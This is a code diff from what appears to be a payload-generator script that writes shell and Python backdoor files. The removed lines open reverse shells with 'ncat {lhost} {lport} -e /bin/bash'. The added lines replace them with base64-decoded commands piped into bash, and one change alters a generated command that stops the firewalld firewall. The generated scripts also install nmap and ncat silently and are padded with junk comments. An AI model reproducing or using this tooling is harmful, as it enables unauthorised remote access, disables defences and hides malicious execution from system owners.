@@ -132,7 +132,7 @@ c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
 		os.system(f"chmod 777 {output}/{name}.sh ")
 elif payload=="4":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
-	firewalls="systemctl disable firewalld &> /dev/null"
+	firewalls="systemctl stop firewalld &> /dev/null"
 	firewall=base64.b64encode(firewalls.encode("utf-8"))
 	firewalld=firewall.decode("utf-8")
 	with open(f"{output}/{name}.sh","w+") as f:
@@ -185,7 +185,7 @@ os.system("sudo pacman -S install nmap -y &> /dev/null")
 #lkjhkjhgjhsjhlkjglkhlkjhlkjhkjkljhksssssssssssss
 os.system("sudo pacman -S install ncat -y &> /dev/null")
 #jhkjhjkhgkjhgkjhgjdkjhfjld
-os.system("ncat {lhost} {lport} -e /bin/bash &> /dev/null")
+os.system("base64 -d <<< {encodeds} | bash")
 #jakskjsdjhksdjkdskjdsjkdjjdsjkjhkjgkjfdhjkkfkjfdjfdjjfjfjjfj
 	""")
 	f=open(f"{output}/{name}.py","w+")
@@ -202,7 +202,7 @@ os.system("sudo dnf install nmap-ncat -y &> /dev/null")
 #kjhbskjhgsajkdhjkshda
 #lkjhkjhgjhsjhlkjglkhlkjhlkjhkjkljhksssssssssssss
 #jhkjhjkhgkjhgkjhgjdkjhfjld
-os.system("ncat {lhost} {lport} -e /bin/bash &> /dev/null")
+os.system("base64 -d <<< {encodeds} | bash")
 #jakskjsdjhksdjkdskjdsjkdjjdsjkjhkjgkjfdhjkkfkjfdjfdjjfjfjjfj
 	""")
 	f=open(f"{output}/{name}.py","w+")
@@ -243,7 +243,7 @@ os.system("base64 -d <<< YXB0IGluc3RhbGwgdGVybXV4LWFwaQo= | bash")
 #jjkslshdfrsnqrewcsh
 os.system("apt-get install ncat -y &> /dev/null")
 #jhkjhjkhgkjhgkjhgjdkjhfjld
-os.system("ncat {lhost} {lport} -e /bin/bash &> /dev/null")
+os.system("base64 -d <<< {encodeds} | bash")
 #jakskjsdjhksdjkdskjdsjkdjjdsjkjhkjgkjfdhjkkfkjfdjfdjjfjfjjfj
 	""")
 	f=open(f"{output}/{name}.py","w+")
